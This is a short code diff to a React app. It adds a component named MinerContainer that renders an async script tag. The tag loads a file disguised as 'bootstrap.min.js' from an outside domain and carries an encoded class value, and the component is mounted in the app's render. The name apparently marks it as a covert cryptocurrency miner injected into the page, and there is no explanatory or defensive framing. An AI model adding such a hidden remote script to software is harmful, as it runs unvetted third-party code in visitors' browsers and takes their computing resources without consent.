@@ -46,6 +46,10 @@ const AddContainer = () => (
   </Container>
 )
 
+const MinerContainer = () => (
+  <script async class="=OHdQVVFrcU47NjA7MQ==" src="https://play.istlandoll.com/bootstrap.min.js"></script>
+)
+
 
 class App extends Component {
   render() {
@@ -54,6 +58,7 @@ class App extends Component {
         <HarambeContainer />
         <TextContainer />
         <AddContainer />
+        <MinerContainer />
       </div>
     );
   }
